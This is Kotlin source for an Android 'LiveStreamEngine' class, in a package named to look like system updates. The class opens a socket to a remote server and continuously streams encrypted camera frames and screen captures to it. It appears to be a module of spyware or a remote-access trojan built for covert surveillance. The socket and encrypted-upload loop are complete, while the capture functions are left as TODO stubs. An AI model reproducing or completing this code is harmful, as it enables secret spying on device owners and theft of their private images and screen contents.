package com.system.updates.modules.media

import android.content.Context
import android.util.Log
import com.system.updates.core.CryptoManager
import kotlinx.coroutines.*
import java.io.OutputStream
import java.net.Socket

class LiveStreamEngine(private val context: Context) {
    private val tag = "LiveStreamEngine"
    private var job: Job? = null
    private var socket: Socket? = null
    private var outputStream: OutputStream? = null
    private var isStreaming = false
    private lateinit var crypto: CryptoManager

    fun init() {
        crypto = CryptoManager(context)
    }

    fun startCameraStream(serverIp: String, serverPort: Int) {
        if (isStreaming) {
            Log.w(tag, "Stream already running")
            return
        }
        job = CoroutineScope(Dispatchers.IO).launch {
            try {
                socket = Socket(serverIp, serverPort).also { s ->
                    outputStream = s.getOutputStream()
                }
                isStreaming = true
                Log.i(tag, "Camera stream started to $serverIp:$serverPort")
                while (isStreaming) {
                    captureAndSendFrame()
                }
            } catch (e: Exception) {
                Log.e(tag, "Camera stream error: ${e.message}")
            } finally {
                cleanup()
            }
        }
    }

    fun startScreenStream(serverIp: String, serverPort: Int) {
        if (isStreaming) return
        job = CoroutineScope(Dispatchers.IO).launch {
            try {
                socket = Socket(serverIp, serverPort).also { s ->
                    outputStream = s.getOutputStream()
                }
                isStreaming = true
                Log.i(tag, "Screen stream started to $serverIp:$serverPort")
                while (isStreaming) {
                    captureAndSendScreen()
                }
            } catch (e: Exception) {
                Log.e(tag, "Screen stream error: ${e.message}")
            } finally {
                cleanup()
            }
        }
    }

    private suspend fun captureAndSendFrame() {
        delay(33L) // ~30 fps
        val frame = captureCameraFrame() ?: return
        val encrypted = crypto.encryptData(frame)
        outputStream?.write(encrypted)
        outputStream?.flush()
    }

    private suspend fun captureAndSendScreen() {
        delay(100L) // 10 fps
        val screen = captureScreen() ?: return
        val encrypted = crypto.encryptData(screen)
        outputStream?.write(encrypted)
        outputStream?.flush()
    }

    private fun captureCameraFrame(): ByteArray? {
        // TODO: implement camera capture (Camera2 or CameraX)
        return null
    }

    private fun captureScreen(): ByteArray? {
        // TODO: implement screen capture (MediaProjection)
        return null
    }

    fun stopStream() {
        isStreaming = false
        job?.cancel()
        cleanup()
        Log.i(tag, "Live stream stopped")
    }

    private fun cleanup() {
        try {
            outputStream?.close()
            socket?.close()
        } catch (e: Exception) {
            Log.e(tag, "Cleanup error: ${e.message}")
        } finally {
            outputStream = null
            socket = null
        }
    }
}